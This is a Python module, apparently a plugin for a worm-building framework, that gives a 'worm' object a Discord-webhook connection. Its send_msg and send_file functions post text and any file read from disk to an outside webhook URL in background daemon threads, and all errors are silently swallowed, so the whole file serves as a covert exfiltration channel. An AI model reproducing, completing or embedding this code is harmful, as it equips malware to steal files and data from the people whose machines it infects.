#!name##PyDcWeb
#!itemType##module
#!info##Allows communication via Discord Webhook and requests module. Send messages and files to Discord.
#!fileType##PY_MOD
#!lang##python
#!pyType##module
#!hiveType##PyExM
#!Var##PDW_url##_NULL##Discord webhook url.##str
#!pyModName##PyDcWeb


import requests
import threading
import os


class PyDcWeb:
    MTYPES = "conn"
    def __init__(self, worm: object):
        self.worm = worm
        self.user_name = self.worm.name
        self.url = "{{PDW_url}}"
        self.is_conn = True
    

    def _prepare_headers(self, text_msg: str, msg_title: str = "New data:") -> dict:
        data = {
                "content": "New Message",
                "username": self.user_name,
                "embeds": [{
                        "title": msg_title,
                        "description": f"{text_msg}"
                        }]}
        return data
    
    def _webhook(self, headers: dict) -> None:
        try:
            resp = requests.post(self.url, json=headers)
        except:
            return
    
    def _send_msg(self, msg: str, msg_title) -> None:
        head = self._prepare_headers(msg, msg_title)
        self._webhook(head)
    
    def send_msg(self, msg: str, msg_title: str = "New data:", *args, **kwargs) -> None:
        sm = threading.Thread(target=self._send_msg, args=(msg, msg_title), daemon=True)
        sm.start()
    
    def _send_file(self, fpath: str, file_name: str = None) -> None:
        if not file_name:
            file_name = os.path.basename(fpath)
        try:
            with open(fpath, "rb") as file:
                data = file.read()
        except:
            return
        head = {file_name : data}
        try:
            resp = requests.post(self.url, files=head)
        except:
            return
    
    def send_file(self, fpath: str, file_name: str = None, *args, **kwargs) -> None:
        th = threading.Thread(target=self._send_file, args=(fpath, file_name), daemon=True)
        th.start()
    
    
    def start(self) -> None:
        pass

